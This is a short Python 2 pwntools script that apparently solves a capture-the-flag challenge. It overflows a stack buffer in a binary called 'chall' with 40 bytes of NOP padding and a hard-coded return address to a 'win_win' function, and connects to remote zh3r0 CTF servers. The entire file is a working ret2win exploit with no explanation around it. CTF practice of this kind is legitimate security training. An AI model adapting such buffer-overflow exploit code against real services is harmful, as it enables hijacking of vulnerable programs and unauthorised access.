#!/usr/bin/env python2

from pwn import *
context(arch='amd64', os='linux')

def pwn():

    e = ELF("./chall")
    #ret2winaddr = p64(e.symbols["win_win"])
    ret2winaddr = p64(0x40070b)

    info("%#x target", e.symbols.win_win)

    #io = process('./chall')
    io = remote('europe.pwn.zh3r0.ml', 3456)
    #io = remote('asia.pwn.zh3r0.ml', 3456)
    #io = remote('us.zh3r0.ml', 3456)
    print(io.recvuntil("Please provide us your name:"))

    buf = '\x90' * 40
    io.sendline(buf + ret2winaddr + "\n")
    print(io.recvall())

if __name__ == '__main__':
    pwn()
